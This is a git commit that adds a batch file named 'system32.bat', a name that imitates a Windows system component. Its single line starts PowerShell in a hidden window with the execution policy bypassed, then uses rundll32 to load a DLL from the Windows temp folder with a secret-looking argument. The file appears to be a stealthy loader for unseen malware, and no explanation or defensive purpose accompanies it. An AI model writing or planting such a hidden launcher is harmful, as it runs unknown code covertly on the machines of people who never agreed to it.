59f9ea5e8f4b8d13e1921d76ae2f4db5a19b732c
CyberSec Consultors <97306773+0v3rdrive@users.noreply.github.com>
2025-04-07 14:14:11 +0200

    Add files via upload

---
+++ system32.bat
@@ -0,0 +1,3 @@
+powershell.exe -nop -w hidden -noprofile -executionpolicy bypass -noni C:\windows\system32\cmd.exe cmd /c rundll32 C:\windows\temp\system32_8954395.dll,EPoint comemelaspelotas1234
+
+
